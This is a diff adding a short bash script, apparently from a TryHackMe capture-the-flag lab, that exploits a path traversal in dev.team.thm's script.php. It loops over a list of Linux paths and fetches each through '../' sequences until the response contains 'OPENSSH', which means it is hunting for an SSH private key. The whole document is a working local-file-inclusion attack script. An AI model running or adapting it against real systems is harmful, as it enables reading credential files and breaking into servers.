@@ -1,0 +1,15 @@
+#!/bin/bash
+filename='linux-paths.txt'
+
+while read line  
+do 
+echo "[+] Trying $line"
+curl http://dev.team.thm/script.php\?page\=../../../../../../../../$line > result.txt
+if [[ -n ` grep "OPENSSH" result.txt`   ]]
+then
+        break
+else
+        continue
+fi
+
+done < $filename
